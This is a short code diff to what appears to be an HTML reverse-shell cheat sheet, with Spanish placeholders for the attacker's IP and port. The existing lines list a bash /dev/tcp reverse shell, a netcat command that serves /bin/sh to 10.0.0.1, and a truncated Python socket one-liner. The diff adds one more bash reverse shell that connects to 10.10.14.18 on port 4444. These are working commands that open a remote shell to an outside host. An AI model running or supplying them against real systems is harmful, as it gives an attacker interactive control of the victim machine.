@@ -124,6 +124,7 @@
                         <h2>Bash</h2>
                         <pre><code class="language-bash">bash -i >& /dev/tcp/TU_IP/TU_PUERTO 0>&1</code></pre>
                         <pre><code class="language-bash">nc -e /bin/sh 10.0.0.1 1234</code></pre>
+                        <pre><code class="language-bash">bash -c "bash -i >& /dev/tcp/10.10.14.18/4444 0>&1"</code></pre>
                         <h2>Python</h2>
                         <pre><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))</code></pre>
                         <h2>PHP</h2>
